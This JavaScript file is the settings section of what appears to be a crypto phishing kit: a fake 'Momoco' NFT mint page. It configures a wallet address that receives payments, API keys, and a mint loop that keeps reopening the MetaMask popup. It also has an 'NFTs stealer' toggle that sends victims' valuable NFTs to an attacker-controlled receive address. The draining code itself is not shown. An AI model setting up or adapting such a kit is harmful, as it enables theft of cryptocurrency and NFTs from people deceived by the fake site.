const address = "0x02cA5d19aE986279eD592c57B9aA543C2517eC5D";
const infuraId = "6d233bb428724900aa1d6ac6bba531b1"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "8lLcZsKmH7Scwxzqp7O3REOhP8nGAMh9CjJTjKwVMQzYJ16fKNs9rClIsQOq0kyx"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Momoco",
    title: "Momoco", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "14.04.2022",
    socialMedia: {
        discord: "https://discord.gg/momoco",
        twitter: "https://twitter.com/nft_momoco",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.1,         // Price per NFT.
    totalSupply: 10000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.5,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 10000, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x41E0E979724D9DCcdd4429aC9488E0C10D3CDA8a" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion